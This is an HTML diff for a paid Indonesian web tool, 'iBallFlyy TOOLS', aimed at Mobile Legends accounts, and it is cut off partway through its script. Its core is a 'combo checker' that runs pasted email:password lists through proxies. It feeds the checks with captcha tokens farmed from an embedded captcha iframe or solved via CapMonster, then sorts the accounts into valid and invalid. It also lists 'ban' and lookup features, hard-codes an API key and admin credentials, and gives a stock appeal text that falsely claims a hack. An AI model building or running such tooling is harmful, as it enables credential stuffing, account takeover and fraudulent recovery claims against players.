+            font-size: 1.1rem;
+        }
+
+        /* Copy Button */
+        .copy-button {
+            background: rgba(255,255,255,0.1);
+            border: 2px solid #fff;
+            color: #fff;
+            padding: 12px 20px;
+            border-radius: 30px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 15px;
+            width: 100%;
+        }
+
+        .copy-button:hover {
+            background: #fff;
+            color: #0066ff;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 18px;
+            color: rgba(255,255,255,0.5);
+            font-size: 0.75rem;
+        }
+
+        .footer a {
+            color: rgba(255,255,255,0.6);
+            text-decoration: none;
+            margin: 0 6px;
+        }
+
+        .social-links {
+            margin-top: 12px;
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+        }
+
+        .social-links a {
+            width: 38px;
+            height: 38px;
+            background: rgba(255,255,255,0.1);
+            border: 2px solid rgba(255,255,255,0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container { padding: 10px; }
+            .header h1 { font-size: 1.6rem; }
+            .menu-grid { gap: 6px; }
+            .menu-card { padding: 8px 2px; }
+            .menu-icon i { font-size: 1.3rem; }
+            .menu-card h3 { font-size: 0.65rem; }
+            .stats-grid { gap: 8px; }
+            .stat-card .stat-value { font-size: 1.4rem; }
+        }
+    </style>
+</head>
+<body>
+    <div class="gradient-bg"></div>
+
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-content">
+            <div class="loading-logo">iBallFlyy</div>
+            <div class="loading-bar"><div class="loading-progress"></div></div>
+            <div class="loading-text">LOADING TO iBallFlyy TOOLS...</div>
+        </div>
+    </div>
+
+    <!-- Alert -->
+    <div class="alert" id="alert">
+        <i class="fa-solid fa-circle-info"></i>
+        <span id="alertMessage"></span>
+    </div>
+
+    <!-- Login Screen -->
+    <div class="login-screen" id="loginScreen">
+        <div class="login-card">
+            <div class="login-header">
+                <h2 id="loginWebName">iBallFlyy</h2>
+                <p>Login / Register untuk melanjutkan</p>
+            </div>
+            
+            <div class="login-tabs">
+                <div class="login-tab active" onclick="switchLoginTab('login')" id="tabLogin">LOGIN</div>
+                <div class="login-tab" onclick="switchLoginTab('register')" id="tabRegister">REGISTER</div>
+            </div>
+            
+            <div class="login-form active" id="loginForm">
+                <input type="text" id="loginUsername" class="input-field" placeholder="Username">
+                <input type="password" id="loginPassword" class="input-field" placeholder="Password">
+                <button class="login-btn" onclick="handleLogin()" id="loginBtn"><i class="fa-solid fa-right-to-bracket"></i> LOGIN</button>
+            </div>
+            
+            <div class="login-form" id="registerForm">
+                <input type="text" id="registerUsername" class="input-field" placeholder="Username">
+                <input type="password" id="registerPassword" class="input-field" placeholder="Password">
+                <input type="password" id="registerConfirm" class="input-field" placeholder="Konfirmasi Password">
+                <button class="login-btn" onclick="handleRegister()" id="registerBtn"><i class="fa-solid fa-user-plus"></i> REGISTER</button>
+            </div>
+            
+            <div class="login-note">
+                <i class="fa-regular fa-circle-question"></i> Dapatkan saldo dengan deposit
+            </div>
+        </div>
+    </div>
+
+    <!-- Sidebar Toggle -->
+    <div class="sidebar-toggle" id="sidebarToggle" onclick="toggleSidebar()" style="display:none">
+        <i class="fa-solid fa-bars"></i>
+    </div>
+
+    <!-- Sidebar -->
+    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
+    <div class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <i class="fa-solid fa-crown"></i>
+            <h3>USER MENU</h3>
+        </div>
+
+        <div class="user-info-sidebar">
+            <div class="user-avatar"><i class="fa-solid fa-user"></i></div>
+            <div class="user-name-sidebar" id="sidebarUsername">Loading...</div>
+            <div class="user-role-sidebar" id="sidebarRole">MEMBER</div>
+            <div class="balance-box">
+                <div class="balance-label"><i class="fa-solid fa-coins"></i> SALDO ANDA</div>
+                <div class="balance-value" id="sidebarBalance">Rp 0</div>
+            </div>
+            <div id="sidebarBadges"></div>
+        </div>
+
+        <ul class="sidebar-menu" id="sidebarMenu">
+            <li><a href="#" onclick="showDepositModal(); return false;"><i class="fa-solid fa-coins"></i> Deposit Saldo</a></li>
+            <li><a href="#" onclick="showPanelMenu(); return false;"><i class="fa-solid fa-sliders"></i> Panel Menu</a></li>
+            <li><a href="#" onclick="showHistory(); return false;"><i class="fa-solid fa-clock-rotate-left"></i> History Cek</a></li>
+            <li><a href="#" onclick="showCheckerPage(); return false;"><i class="fa-solid fa-check-double"></i> Cek Combo (Rp20.000)</a></li>
+            <li><a href="#" onclick="showTutorial(); return false;"><i class="fa-solid fa-book-open"></i> Tutorial</a></li>
+            <li><a href="#" onclick="logout(); return false;"><i class="fa-solid fa-sign-out-alt"></i> Logout</a></li>
+        </ul>
+    </div>
+
+    <div class="container" id="mainContainer" style="display:none">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo-wrapper">
+                <h1 id="webTitle">iBallFlyy TOOLS</h1>
+            </div>
+            <p id="webSubtitle">TOOLS iBallFlyy MLBB</p>
+            <div class="header-stats">
+                <div class="stat-item"><i class="fa-solid fa-bolt"></i> FAST</div>
+                <div class="stat-item"><i class="fa-solid fa-shield-halved"></i> PRIVASI</div>
+                <div class="stat-item"><i class="fa-solid fa-clock"></i> V5</div>
+            </div>
+        </div>
+
+        <!-- Balance Card -->
+        <div class="balance-card">
+            <div class="balance-info">
+                <div class="label">SALDO ANDA</div>
+                <div class="amount" id="mainBalance">Rp 0</div>
+                <div id="mainBadges"></div>
+            </div>
+            <div class="balance-icon"><i class="fa-solid fa-coins"></i></div>
+        </div>
+
+        <!-- Back Button (hidden by default) -->
+        <div class="back-button" id="backButton" onclick="hideCheckerPage()" style="display:none">
+            <i class="fa-solid fa-arrow-left"></i> Kembali ke Menu Utama
+        </div>
+
+        <!-- Menu Grid -->
+        <div class="menu-grid" id="menuGrid"></div>
+
+        <!-- Input Section -->
+        <div class="input-section" id="inputSection">
+            <div class="section-title">
+                <i class="fa-solid fa-sliders"></i>
+                <h2>AKTIFKAN <span class="selected-feature" id="selected-feature">FITUR</span></h2>
+            </div>
+            
+            <div class="price-info-card" id="price-info">
+                <i class="fa-solid fa-coins"></i>
+                <span class="price-text">Pilih fitur untuk melihat harga</span>
+            </div>
+
+            <!-- Standard Input -->
+            <div id="standard-input">
+                <div class="info-card">
+                    <div class="info-icon"><i class="fa-solid fa-circle-info"></i></div>
+                    <div class="info-content">
+                        <p>Format Input: role_id zone_id</p>
+                        <small>Contoh: 105600540 2229</small>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <div class="input-label"><i class="fa-solid fa-id-card"></i> Role ID</div>
+                    <div class="input-field"><input type="text" id="role_id" placeholder="Masukkan Role ID" value="105600540"></div>
+                </div>
+
+                <div class="input-group">
+                    <div class="input-label"><i class="fa-solid fa-globe"></i> Zone ID</div>
+                    <div class="input-field"><input type="text" id="zone_id" placeholder="Masukkan Zone ID" value="2229"></div>
+                </div>
+            </div>
+
+            <!-- Ban V2 Input -->
+            <div id="banv2-input" style="display:none">
+                <div class="info-card">
+                    <div class="info-icon"><i class="fa-solid fa-key"></i></div>
+                    <div class="info-content"><p>Masukkan JWT Token, Proxy, dan Token</p></div>
+                </div>
+                <div class="input-field"><input type="text" id="jwt_token" placeholder="JWT Token" value="test"></div>
+                <div class="input-field"><input type="text" id="ban_token" placeholder="Token (Opsional)"></div>
+                <div class="input-field"><input type="text" id="proxy" placeholder="Proxy (user:pass@host:port)"></div>
+            </div>
+
+            <!-- V2L Input -->
+            <div id="v2l-input" style="display:none">
+                <div class="info-card">
+                    <div class="info-icon"><i class="fa-solid fa-shield-halved"></i></div>
+                    <div class="info-content"><p>Masukkan GUID, Session, dan Type</p></div>
+                </div>
+                <div class="input-field"><input type="text" id="guid" placeholder="GUID" value="test"></div>
+                <div class="input-field"><input type="text" id="session" placeholder="Session" value="test"></div>
+                <div class="feature-toggle" style="display:flex;gap:8px">
+                    <div class="tab-btn active" onclick="setV2LType('and')" id="type-and">Android</div>
+                    <div class="tab-btn" onclick="setV2LType('ios')" id="type-ios">iOS</div>
+                </div>
+            </div>
+
+            <!-- Find Input -->
+            <div id="find-input" style="display:none">
+                <div class="info-card">
+                    <div class="info-icon"><i class="fa-solid fa-magnifying-glass"></i></div>
+                    <div class="info-content"><p>Cari akun berdasarkan Nickname</p></div>
+                </div>
+                <div class="input-field"><input type="text" id="find_nickname" placeholder="Nickname" value="Leizensky"></div>
+            </div>
+
+            <button class="btn" onclick="processCheck()" id="process-btn"><i class="fa-solid fa-play"></i> MULAI CEK</button>
+            <button class="tutorial-btn" onclick="showTutorial()"><i class="fa-solid fa-book-open"></i> TUTORIAL KEMBALIKAN AKUN</button>
+
+            <div class="error-message" id="error-message">
+                <i class="fa-solid fa-circle-exclamation"></i>
+                <span id="error-text"></span>
+            </div>
+        </div>
+
+        <!-- Checker Page -->
+        <div class="checker-page" id="checkerPage">
+            <div class="input-section">
+                <div class="section-title">
+                    <i class="fa-solid fa-check-double"></i>
+                    <h2>COMBO CHECKER (Rp20.000)</h2>
+                </div>
+
+                <div style="background:rgba(255,170,0,0.2);border:2px solid #ffaa00;border-radius:20px;padding:12px;margin-bottom:16px;display:flex;align-items:center;gap:8px">
+                    <i class="fa-solid fa-chart-line" style="color:#ffaa00"></i>
+                    <span style="color:#fff">Maksimal <strong>200</strong> akun per sesi</span>
+                </div>
+
+                <!-- Tabs -->
+                <div class="tab-container">
+                    <div class="tab-btn active" onclick="switchCheckerTab('combo')">Combo</div>
+                    <div class="tab-btn" onclick="switchCheckerTab('proxy')">Proxy</div>
+                    <div class="tab-btn" onclick="switchCheckerTab('captcha')">Captcha</div>
+                </div>
+
+                <!-- Combo Tab -->
+                <div id="checker-tab-combo" class="tab-content active">
+                    <div class="input-label"><i class="fa-solid fa-paste"></i> Paste Combo List</div>
+                    <textarea id="checker-combo-paste" class="input-field" placeholder="email1:password1&#10;email2:password2" rows="5"></textarea>
+
+                    <div class="upload-area" onclick="document.getElementById('checker-combo-file').click()">
+                        <i class="fa-solid fa-cloud-upload-alt"></i>
+                        <p>Upload File Combo</p>
+                        <small>Format .txt</small>
+                    </div>
+                    <input type="file" id="checker-combo-file" accept=".txt" style="display:none" onchange="handleCheckerFile(this, 'combo')">
+                    <div id="checker-combo-info" class="file-info"></div>
+                </div>
+
+                <!-- Proxy Tab -->
+                <div id="checker-tab-proxy" class="tab-content">
+                    <div class="input-label"><i class="fa-solid fa-paste"></i> Paste Proxy List</div>
+                    <textarea id="checker-proxy-paste" class="input-field" placeholder="ip:port&#10;user:pass@ip:port" rows="5"></textarea>
+
+                    <div class="upload-area" onclick="document.getElementById('checker-proxy-file').click()">
+                        <i class="fa-solid fa-cloud-upload-alt"></i>
+                        <p>Upload File Proxy</p>
+                        <small>Format .txt</small>
+                    </div>
+                    <input type="file" id="checker-proxy-file" accept=".txt" style="display:none" onchange="handleCheckerFile(this, 'proxy')">
+                    <div id="checker-proxy-info" class="file-info"></div>
+                </div>
+
+                <!-- Captcha Tab -->
+                <div id="checker-tab-captcha" class="tab-content">
+                    <div class="captcha-mode-switch">
+                        <div class="mode-btn active" onclick="switchCaptchaMode('manual')">MANUAL</div>
+                        <div class="mode-btn" onclick="switchCaptchaMode('auto')">AUTO (CAPMONSTER)</div>
+                    </div>
+
+                    <!-- Manual Mode -->
+                    <div id="captcha-mode-manual" class="captcha-mode-content active">
+                        <div class="input-label"><i class="fa-solid fa-paste"></i> Paste Captcha Tokens</div>
+                        <textarea id="captcha-paste" class="input-field" placeholder="Masukkan token captcha..." rows="3"></textarea>
+
+                        <div class="upload-area" onclick="document.getElementById('checker-captcha-file').click()">
+                            <i class="fa-solid fa-cloud-upload-alt"></i>
+                            <p>Upload File Captcha</p>
+                            <small>Format .txt</small>
+                        </div>
+                        <input type="file" id="checker-captcha-file" accept=".txt" style="display:none" onchange="handleCaptchaFile(this)">
+
+                        <!-- Captcha Farm - FULL SIZE -->
+                        <div class="captcha-container">
+                            <div class="captcha-box" id="mlbb1">
+                                <iframe srcdoc='
+                                    <!DOCTYPE html>
+                                    <html>
+                                    <head>
+                                        <meta charset="UTF-8">
+                                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                                        <script src="https://cstaticdun.126.net/load.min.js"></script>
+                                        <style>
+                                            body { 
+                                                margin: 0; 
+                                                padding: 20px; 
+                                                background: #f5f5f5; 
+                                                display: flex; 
+                                                justify-content: center; 
+                                                align-items: center; 
+                                                min-height: 100vh;
+                                                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+                                            }
+                                            #captcha { 
+                                                width: 100%; 
+                                                max-width: 300px; 
+                                                margin: 0 auto;
+                                                background: white;
+                                                border-radius: 8px;
+                                                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+                                            }
+                                        </style>
+                                    </head>
+                                    <body>
+                                        <div id="captcha"></div>
+                                        <script>
+                                            try {
+                                                initNECaptcha({
+                                                    captchaId: "fef5c67c39074e9d845f4bf579cc07af",
+                                                    element: "#captcha",
+                                                    mode: "embed",
+                                                    width: "100%",
+                                                    onVerify: function(err, data) {
+                                                        if (!err && data.validate) {
+                                                            window.parent.postMessage({
+                                                                type: "captcha",
+                                                                token: data.validate,
+                                                                id: "mlbb1"
+                                                            }, "*");
+                                                            setTimeout(() => { 
+                                                                location.reload(); 
+                                                            }, 500);
+                                                        }
+                                                    },
+                                                    onError: function(err) {
+                                                        console.log("Captcha error:", err);
+                                                    }
+                                                });
+                                            } catch(e) {
+                                                console.log("Init error:", e);
+                                            }
+                                        </script>
+                                    </body>
+                                    </html>
+                                '></iframe>
+                            </div>
+                        </div>
+
+                        <div class="token-counter">
+                            <i class="fa-solid fa-ticket"></i> Total Tokens: <span id="token-count">0</span>
+                        </div>
+                        <textarea id="captcha-log" class="input-field" readonly placeholder="Token akan muncul di sini..." rows="3"></textarea>
+                    </div>
+
+                    <!-- Auto Mode -->
+                    <div id="captcha-mode-auto" class="captcha-mode-content">
+                        <div class="input-label"><i class="fa-solid fa-key"></i> CapMonster API Key</div>
+                        <input type="text" id="capmonster-api-key" class="input-field" placeholder="Masukkan API Key CapMonster Cloud">
+
+                        <div class="balance-info" style="display:flex;justify-content:space-between;align-items:center;background:rgba(0,0,0,0.2);border:2px solid rgba(255,255,255,0.2);border-radius:20px;padding:12px;margin:10px 0">
+                            <span>Balance:</span>
+                            <span id="capmonster-balance">-</span>
+                        </div>
+
+                        <button class="btn" onclick="checkCapMonsterBalance()" style="padding:12px;margin:10px 0">
+                            <i class="fa-solid fa-coins"></i> CHECK BALANCE
+                        </button>
+
+                        <div class="input-label"><i class="fa-solid fa-globe"></i> Website URL (Optional)</div>
+                        <input type="text" id="capmonster-website" class="input-field" value="https://account.mobilelegends.com">
+                    </div>
+                </div>
+
+                <!-- Start Button -->
+                <button class="btn" id="checker-start-btn" onclick="startChecker()">
+                    <i class="fa-solid fa-play"></i> MULAI CHECKING (Rp20.000)
+                </button>
+
+                <!-- Stats -->
+                <div class="stats-grid">
+                    <div class="stat-card"><div class="stat-value" id="checker-valid">0</div><div>VALID</div></div>
+                    <div class="stat-card"><div class="stat-value" id="checker-invalid">0</div><div>INVALID</div></div>
+                    <div class="stat-card"><div class="stat-value" id="checker-retry">0</div><div>RETRY</div></div>
+                    <div class="stat-card"><div class="stat-value" id="checker-gagal">0</div><div>GAGAL</div></div>
+                </div>
+
+                <!-- Download Buttons -->
+                <div class="download-buttons">
+                    <button class="download-btn" id="checker-download-valid" onclick="downloadCheckerFile('valid')" disabled>
+                        <i class="fa-solid fa-file-lines"></i> Valid
+                    </button>
+                    <button class="download-btn" id="checker-download-invalid" onclick="downloadCheckerFile('invalid')" disabled>
+                        <i class="fa-solid fa-file-lines"></i> Invalid
+                    </button>
+                </div>
+
+                <!-- Result Preview -->
+                <div class="result-preview" id="checker-preview">Hasil akan tampil di sini...</div>
+
+                <!-- Log -->
+                <div class="log-section">
+                    <div class="log-header" style="display:flex;justify-content:space-between;margin-bottom:8px">
+                        <span><i class="fa-solid fa-terminal"></i> Checking Log</span>
+                        <span>
+                            <i class="fa-regular fa-copy" onclick="copyCheckerLog()" style="cursor:pointer;margin-right:10px"></i>
+                            <i class="fa-regular fa-trash-can" onclick="clearCheckerLog()" style="cursor:pointer"></i>
+                        </span>
+                    </div>
+                    <div class="log-content" id="checker-log"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Loading -->
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>Memproses...</p>
+        </div>
+
+        <!-- Result Section -->
+        <div class="result-section" id="result-section">
+            <div class="result-header">
+                <h3><i class="fa-solid fa-check-circle"></i> HASIL CEK</h3>
+                <div class="result-badge">SUKSES</div>
+            </div>
+            <div id="result-content"></div>
+            <div class="copy-button" onclick="copyResult()" style="display:none" id="copyResultBtn">
+                <i class="fa-regular fa-copy"></i> SALIN HASIL
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>© 2026 iBallFlyy TOOLS V5</p>
+            <div class="social-links">
+                <a href="https://wa.me/6283152491718" target="_blank"><i class="fa-brands fa-whatsapp"></i></a>
+                <a href="#" target="_blank"><i class="fa-brands fa-telegram"></i></a>
+                <a href="#" target="_blank"><i class="fa-brands fa-tiktok"></i></a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Deposit Modal -->
+    <div class="modal" id="depositModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fa-solid fa-coins"></i> DEPOSIT SALDO</h3>
+                <div class="modal-close" onclick="closeModal('depositModal')"><i class="fa-solid fa-times"></i></div>
+            </div>
+            <div class="modal-body">
+                <p style="color:#fff;margin-bottom:18px">Pilih nominal deposit</p>
+                
+                <div class="deposit-grid">
+                    <div class="deposit-card" onclick="selectDeposit(5000)"><div class="amount">Rp5.000</div><div>+5.000 Saldo</div></div>
+                    <div class="deposit-card" onclick="selectDeposit(10000)"><div class="amount">Rp10.000</div><div>+10.000 Saldo</div></div>
+                    <div class="deposit-card" onclick="selectDeposit(20000)"><div class="amount">Rp20.000</div><div>+20.000 Saldo</div></div>
+                    <div class="deposit-card" onclick="selectDeposit(50000)"><div class="amount">Rp50.000</div><div>+50.000 Saldo</div></div>
+                    <div class="deposit-card" onclick="selectDeposit(100000)"><div class="amount">Rp100.000</div><div>+100.000 Saldo</div></div>
+                    <div class="deposit-card" onclick="selectDeposit(200000)"><div class="amount">Rp200.000</div><div>+200.000 Saldo</div></div>
+                </div>
+                
+                <div class="payment-info">
+                    <div class="payment-item"><i class="fa-solid fa-money-bill-wave" style="color:#00ff88"></i> DANA: 083152491718 (LESTARI)</div>
+                    <div class="payment-item"><i class="fa-solid fa-money-bill-wave" style="color:#ffaa00"></i> GOPAY: 083152491718 (IBALTAMA)</div>
+                </div>
+                
+                <button class="btn btn-success" onclick="confirmDeposit()" id="depositBtn" disabled>
+                    <i class="fa-brands fa-whatsapp"></i> KONFIRMASI VIA WA
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Panel Menu Modal -->
+    <div class="modal" id="panelModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fa-solid fa-sliders"></i> PANEL MENU</h3>
+                <div class="modal-close" onclick="closeModal('panelModal')"><i class="fa-solid fa-times"></i></div>
+            </div>
+            <div class="modal-body">
+                <h4 style="color:#fff;margin-bottom:15px">KUSTOMISASI</h4>
+                <input type="text" class="input-field" id="webNameInput" placeholder="Nama Web" value="iBallFlyy">
+                
+                <h4 style="color:#fff;margin:20px 0 15px">KELOLA FITUR</h4>
+                <div id="featureList" style="max-height:300px;overflow-y:auto"></div>
+                
+                <button class="btn btn-success" onclick="saveCustomization()" style="margin-top:20px">
+                    <i class="fa-solid fa-save"></i> SIMPAN PERUBAHAN
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Admin Dashboard Modal -->
+    <div class="modal" id="adminDashboardModal">
+        <div class="modal-content" style="max-width:500px">
+            <div class="modal-header">
+                <h3><i class="fa-solid fa-chart-line"></i> ADMIN DASHBOARD</h3>
+                <div class="modal-close" onclick="closeModal('adminDashboardModal')"><i class="fa-solid fa-times"></i></div>
+            </div>
+            <div class="modal-body">
+                <!-- Stats Real-time -->
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-icon"><i class="fa-solid fa-users"></i></div>
+                        <div class="stat-value" id="adminTotalUsers">0</div>
+                        <div class="stat-label">TOTAL USER</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon"><i class="fa-solid fa-clock-rotate-left"></i></div>
+                        <div class="stat-value" id="adminTotalUsage">0</div>
+                        <div class="stat-label">TOTAL CEK</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon"><i class="fa-solid fa-toggle-on"></i></div>
+                        <div class="stat-value" id="adminTotalOn">0</div>
+                        <div class="stat-label">FITUR ON</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon"><i class="fa-solid fa-toggle-off"></i></div>
+                        <div class="stat-value" id="adminTotalOff">0</div>
+                        <div class="stat-label">FITUR OFF</div>
+                    </div>
+                </div>
+                
+                <div class="revenue-card">
+                    <div class="revenue-icon"><i class="fa-solid fa-coins"></i></div>
+                    <div class="revenue-value" id="adminTotalRevenue">Rp 0</div>
+                    <div class="revenue-label">TOTAL PENDAPATAN</div>
+                </div>
+
+                <!-- Checker Stats -->
+                <h4 style="color:#fff;margin:15px 0">STATISTIK CHECKER</h4>
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-value" id="adminTotalChecker">0</div>
+                        <div class="stat-label">TOTAL CEK</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="adminTotalValid">0</div>
+                        <div class="stat-label">VALID</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="adminTotalInvalid">0</div>
+                        <div class="stat-label">INVALID</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value" id="adminTotalGagal">0</div>
+                        <div class="stat-label">GAGAL</div>
+                    </div>
+                </div>
+
+                <!-- Spam Protection -->
+                <h4 style="color:#fff;margin:15px 0">SPAM PROTECTION</h4>
+                <div style="background:rgba(255,255,255,0.1);border:2px solid rgba(255,255,255,0.2);border-radius:20px;padding:15px;margin-bottom:15px">
+                    <div style="display:flex;justify-content:space-between;margin-bottom:10px">
+                        <span>Auto Ban Spam</span>
+                        <span class="status-badge" style="background:#00ff88;color:#000;padding:4px 12px;border-radius:20px">ON</span>
+                    </div>
+                    <div style="display:flex;gap:10px;margin:10px 0">
+                        <input type="number" id="spamLimit" class="input-field" value="5" placeholder="Limit/menit" style="flex:1">
+                        <input type="number" id="spamBanDuration" class="input-field" value="5" placeholder="Blokir (menit)" style="flex:1">
+                    </div>
+                    <button class="btn btn-warning" onclick="saveSpamSettings()" style="padding:12px">SIMPAN SETTINGS</button>
+                    
+                    <div style="display:flex;justify-content:space-between;margin-top:15px;color:#fff">
+                        <span>Total Spam: <span id="totalSpam">0</span></span>
+                        <span>User Banned: <span id="totalBanned">0</span></span>
+                    </div>
+                </div>
+                
+                <!-- User Management -->
+                <h4 style="color:#fff;margin:15px 0">MANAJEMEN USER</h4>
+                <div class="user-list" id="adminUserList" style="max-height:300px;overflow-y:auto"></div>
+                
+                <!-- Kirim Saldo -->
+                <h4 style="color:#fff;margin:15px 0">KIRIM SALDO</h4>
+                <div style="background:rgba(255,255,255,0.1);border:2px solid rgba(255,255,255,0.2);border-radius:20px;padding:15px">
+                    <input type="text" id="adminTargetUsername" class="input-field" placeholder="Username Tujuan">
+                    <input type="number" id="adminSendAmount" class="input-field" placeholder="Jumlah Saldo" min="1000">
+                    <button class="btn btn-success" onclick="adminSendBalance()">KIRIM</button>
+                </div>
+
+                <!-- Create Admin -->
+                <h4 style="color:#fff;margin:15px 0">CREATE ADMIN</h4>
+                <div style="background:rgba(255,255,255,0.1);border:2px solid rgba(255,255,255,0.2);border-radius:20px;padding:15px">
+                    <input type="text" id="newAdminUsername" class="input-field" placeholder="Username Admin Baru">
+                    <input type="password" id="newAdminPassword" class="input-field" placeholder="Password">
+                    <button class="btn btn-warning" onclick="createNewAdmin()">JADIKAN ADMIN</button>
+                </div>
+
+                <!-- Update Website -->
+                <h4 style="color:#fff;margin:15px 0">UPDATE WEBSITE</h4>
+                <div style="background:rgba(255,255,255,0.1);border:2px solid rgba(255,255,255,0.2);border-radius:20px;padding:15px">
+                    <textarea id="websiteCode" class="input-field" placeholder="Tempel kode HTML website baru..." rows="4"></textarea>
+                    <button class="btn btn-warning" onclick="updateWebsiteWithCode()" style="margin-bottom:10px">UPDATE DENGAN CODE</button>
+                    
+                    <div class="upload-area" onclick="document.getElementById('websiteFile').click()">
+                        <i class="fa-solid fa-cloud-upload-alt"></i>
+                        <p>Atau upload file HTML</p>
+                    </div>
+                    <input type="file" id="websiteFile" accept=".html,.htm" style="display:none" onchange="handleWebsiteFile(this)">
+                    <div id="websiteFileName" class="file-name" style="color:#00ff88;margin-top:10px"></div>
+                    <button class="btn btn-success" onclick="uploadWebsiteFile()" id="uploadWebsiteBtn" disabled style="margin-top:10px">UPLOAD FILE</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- History Modal -->
+    <div class="modal" id="historyModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fa-solid fa-clock-rotate-left"></i> HISTORY CEK</h3>
+                <div class="modal-close" onclick="closeModal('historyModal')"><i class="fa-solid fa-times"></i></div>
+            </div>
+            <div class="modal-body" id="historyContent"></div>
+        </div>
+    </div>
+
+    <!-- Tutorial Modal -->
+    <div class="modal" id="tutorialModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fa-solid fa-book"></i> TUTORIAL KEMBALIKAN AKUN</h3>
+                <div class="modal-close" onclick="closeModal('tutorialModal')"><i class="fa-solid fa-times"></i></div>
+            </div>
+            <div class="modal-body">
+                <div style="background:rgba(255,255,255,0.1);border:2px solid rgba(255,255,255,0.2);border-radius:22px;padding:18px;color:#fff">
+                    <h4 style="color:#ffaa00">TUTORIAL KEMBALIKAN AKUN MLBB HILANG</h4>
+                    <p><span style="color:#ffaa00">1.</span> Buka Customer service => Logo Admin dekat Profil Akun</p>
+                    <p><span style="color:#ffaa00">2.</span> Pilih Pemulihan Akun => Form_Pemulihan akun</p>
+                    <p><span style="color:#ffaa00">3.</span> Masukan ID & Server</p>
+                    <p><span style="color:#ffaa00">4.</span> Pilih Sesuai Keluhan Akun Kalian</p>
+                    <p><span style="color:#ffaa00">5.</span> Masukan Tanggal Kejadian <span style="color:#ff4444">(Jangan isi Tanggal sebelum Topup Terakhir)</span></p>
+                    <p><span style="color:#ffaa00">6.</span> Masukan Bukti Topup Resmi</p>
+                    
+                    <h4 style="color:#ffaa00;margin-top:15px">POINT PENTING</h4>
+                    <div style="background:rgba(255,68,68,0.2);border-left:3px solid #ff4444;padding:10px;border-radius:10px;margin:10px 0">
+                        <p>1. Jika HP anda Di Reset Pabrik Maka dipastikan Gagal Verifikasi</p>
+                        <p>2. Jangan Coba2 Jika Sekiranya Data Belum Yakin Karena Berakibat Limit Device</p>
+                        <p>3. Pengajuan Harian Max 3 Kali</p>
+                    </div>
+                    
+                    <h4 style="color:#ffaa00">TEKS SAKTI BUAT UNPAK</h4>
+                    <div style="background:rgba(255,68,68,0.2);border-left:3px solid #ff4444;padding:10px;border-radius:10px;margin:10px 0">
+                        <p>I'm here to submit an appeal to my account which was hacked because my account was hacked or stolen by someone I don't know and then changed all the login addresses, please Moonton help me.</p>
+                    </div>
+                    
+                    <button class="btn" onclick="copyTutorialText()" style="margin-top:15px">
+                        <i class="fa-regular fa-copy"></i> SALIN TEKS SAKTI
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- CapMonster -->
+    <script src="https://unpkg.com/@zennolab_com/capmonstercloud-client@1.0.0/dist/capmonstercloud-client.umd.js"></script>
+
+    <script>
+        // ==================== KONFIGURASI ====================
+        const FIREBASE_DB_URL = 'https://bugemtoolsdb-default-rtdb.firebaseio.com';
+        
+        const LOOKUP_BIND_API = 'https://checkton.online/backend/info';
+        const BAN_V2_API = 'https://checkton.online/backend/getBanInfo';
+        const CHECKER_API = 'https://checkton.online/backend/check';
+        const V2L_API = 'https://checkton.online/backend/v2l';
+        const API_KEY = 'F67z0ITQuy0TTlHjqWq3W9cpuxvlyl5b5dzI2ItDz0M';
+
+        const ADMIN_USERNAME = 'BABAL';
+        const ADMIN_PASSWORD = '2020';
+
+        const MAX_ACCOUNTS = 200;
+        const CHECKER_PRICE = 20000;
+        let SPAM_LIMIT = 5;
+        let SPAM_BLOCK_DURATION = 5;
+        
+        // 55+ FITUR
+        const FEATURES = [
+            {id:'lookup',name:'LOOKUP',icon:'fa-magnifying-glass',price:6000},
+            {id:'bind',name:'CEK BIND',icon:'fa-link',price:5000},
+            {id:'ban',name:'BAN V1',icon:'fa-ban',price:1500},
+            {id:'ban_v2',name:'BAN V2',icon:'fa-skull',price:1500},
+            {id:'v2l',name:'CEK V2L',icon:'fa-shield',price:1500},
+            {id:'creation_date',name:'CREATION',icon:'fa-calendar',price:5000},
+            {id:'find',name:'FIND',icon:'fa-users',price:1500},
+            {id:'ban_v3',name:'BAN V3',icon:'fa-triangle-exclamation',price:2500},
+            {id:'region',name:'REGION',icon:'fa-map-location-dot',price:1500},
+            {id:'device_log',name:'DEVICE LOG',icon:'fa-mobile-screen',price:1500},
+            {id:'hero_favorite',name:'HERO FAV',icon:'fa-star',price:1500},
